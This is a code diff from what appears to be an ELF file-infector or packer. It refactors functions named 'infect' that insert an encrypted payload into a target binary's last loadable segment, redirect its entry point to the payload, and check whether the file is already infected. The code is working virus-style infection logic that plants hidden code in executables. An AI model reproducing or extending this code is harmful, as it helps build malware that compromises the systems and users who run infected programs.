@@ -70,7 +70,7 @@ static void _insert_zeros(char **s, size_t *n, size_t pos, size_t add){
 
 void update(char *b, size_t n, size_t old_entry, size_t entry, struct s_opt opt, char *s, size_t sn, bool compressed){
 	//add a few information about himself
-	size_t pos = 0/*elf_offset_entry(b, n)*/;
+	size_t pos = 0;
 	//modifying 2bit after
 	size_t *p = ((size_t *)(char*)(b + pos + DATA));
 	p[0] = max(old_entry,entry) - min(old_entry,entry);
@@ -85,7 +85,7 @@ void update(char *b, size_t n, size_t old_entry, size_t entry, struct s_opt opt,
 	get_sig(s, sn, n, (char*)(p + 7));
 }
 
-static int _infect(char **s, size_t *n, char *b, size_t bn, size_t crypt_off, size_t crypt_len, struct s_opt opt){
+static int _infect(char **s, size_t *n, struct s_infect_params p, struct s_opt opt){
 	Elf64_Ehdr *h = (void*)*s;
 	Elf64_Phdr *ph = (*(void**)s) + h->e_phoff;
 
@@ -111,20 +111,26 @@ static int _infect(char **s, size_t *n, char *b, size_t bn, size_t crypt_off, si
 	size_t pos = ph[x].p_offset + ph[x].p_filesz;
 	size_t oldn2 = *n;
 	char *olds2 = *s;
-	_insert(s, n, pos-1, b, bn);
+	_insert(s, n, pos-1, p.b, p.bn);
 	//encryption
-	bool compressed = TRUE;
-	uint64_t changed = encrypt(((*s) + pos + crypt_off), crypt_len, (uint32_t*)key, &compressed);
+	bool compressed;
+	//---------- z2 (encryption without compression) -------------
+	compressed = FALSE;
+	//encrypt(((*s) + pos + p.cmpr_off), p.cmpr_len, (uint32_t*)key, &compressed);
+	//---------- z3 (encryption with compression) ----------------
+	compressed = TRUE;
+	uint64_t changed = encrypt(((*s) + pos + p.crypt_off), p.crypt_len, (uint32_t*)key, &compressed);
+
 	//reset it
-	elf_shift_offset(*s, *n, pos, bn);
+	elf_shift_offset(*s, *n, pos, p.bn);
 	elf_update_flags_of_load_segments(*s, *n);
-	elf_change_size_last_load_segment(*s, *n, bn);
+	elf_change_size_last_load_segment(*s, *n, p.bn);
 	elf_set_off_entry(*s, *n, pos);
 	h = (void*)*s;
 	ph = (*(void**)s) + h->e_phoff;
 	//TODO: check not already inf
 	//ph[x].p_memsz += changed;
-	update((*s) + pos, bn, old_entry, h->e_entry, opt, *s, *n, compressed);
+	update((*s) + pos, p.bn, old_entry, h->e_entry, opt, *s, *n, compressed);
 	ffree(olds2, oldn2);
 	if (olds)
 		ffree(olds, oldn);
@@ -149,7 +155,7 @@ int check_already_packed(char *s, size_t n, size_t virus_len){
 	return TRUE;
 }
 
-int infect(char *fname, char *outname, char *b, size_t bn, size_t crypt_off, size_t crypt_len, struct s_opt opt){
+int infect(char *fname, char *outname, struct s_infect_params p, struct s_opt opt){
 	char *s;
 	size_t n;
 	int ret = TRUE;
@@ -160,10 +166,10 @@ int infect(char *fname, char *outname, char *b, size_t bn, size_t crypt_off, siz
 		goto fail;
 	}
 	if (elf_check_valid(s, n) == FALSE) goto fail;
-	if (!check_already_packed(s, n, bn)) goto fail;
+	if (!check_already_packed(s, n, p.bn)) goto fail;
 
 	//after insert, update data
-	if (!_infect(&s,&n, b, bn, crypt_off, crypt_len, opt))
+	if (!_infect(&s,&n, p, opt))
 		goto fail;
 	if (!fput(outname, s, n))
 	{
